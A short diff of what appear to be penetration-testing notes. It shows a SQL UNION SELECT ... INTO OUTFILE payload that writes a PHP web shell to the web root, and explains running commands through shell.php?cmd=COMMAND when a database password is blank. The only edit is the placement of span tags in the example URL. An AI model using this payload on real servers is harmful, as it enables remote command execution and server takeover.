@@ -64,4 +64,4 @@
       UNION SELECT "<? system($_REQUEST['cmd']); ?>"
       INTO OUTFILE "/var/www/html/shell.php"
     * Password is blank, so you can upload that cmd script then visit that scripts URL to execute it.
-        * <span>http:<span>//www.<span>example.<span>com/shell.php?cmd=COMMAND
+        * <span>http:<span>//w<span>ww.<span>example.<span>com/shell.php?cmd=COMMAND
